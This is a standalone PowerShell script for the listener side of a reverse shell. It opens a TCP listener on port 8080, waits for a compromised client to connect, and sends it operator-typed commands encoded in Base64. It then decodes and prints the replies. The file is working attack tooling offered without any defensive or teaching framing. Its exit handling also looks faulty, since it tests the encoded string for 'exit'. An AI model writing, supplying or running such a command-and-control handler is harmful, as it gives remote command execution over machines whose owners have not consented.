

function PSHandler($port)
{
    $socket = New-Object System.Net.IPEndPoint([IPAddress]::Any,$port)

    $handler = New-Object System.Net.Sockets.TCPListener $socket 

    $handler.Start()

    Write-Host "Listening on: $port"

    while($true)
    {
        $client = $handler.AcceptTCPClient()

        if($client)
        {
            $remoteAddress = $client.Client.RemoteEndPoint.Address
            $remotePort    = $client.Client.RemoteEndPoint.Port 

            Write-Host "[*]Connection from: $remoteAddress | $remotePort"

            $stream = $client.GetStream()

            $bytes = New-Object System.Byte[] 1024

            $encodingScheme = New-Object System.Text.ASCIIEncoding

            while($true)
            {
                #$cmd   = $encodingScheme.GetString($bytes,0,$var)
                $receiver    = New-Object System.IO.StreamReader($stream)
                $cmd         = Read-Host "[*]>>>"
                $cmd         = [System.Text.Encoding]::Unicode.GetBytes($cmd)
                $cmd         = [Convert]::ToBase64String($cmd)

                if($cmd)
                {
                    if($cmd | Select-String 'exit')
                    {
                        $client.Close()
                        Write-Host "[~] Client connection closed"
                        Write-Host "[~] Returning to main loop"
                        Write-Host "[*] Listening on: $port"
                    }

                    try
                    {
                        $transmitter = New-Object System.IO.StreamWriter($stream)
                        $transmitter.WriteLine($cmd)
                        $transmitter.Flush() 
                    }
                    catch
                    {
                        continue
                    }
                }

                $intake      = $receiver.ReadLine()
                $intake      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($intake))
                $response    = $intake

                if($intake)
                {
                    Write-Host $response
                }

            }
            $stream.Close()
            $client.Close()
        }
    }
}

PSHandler 8080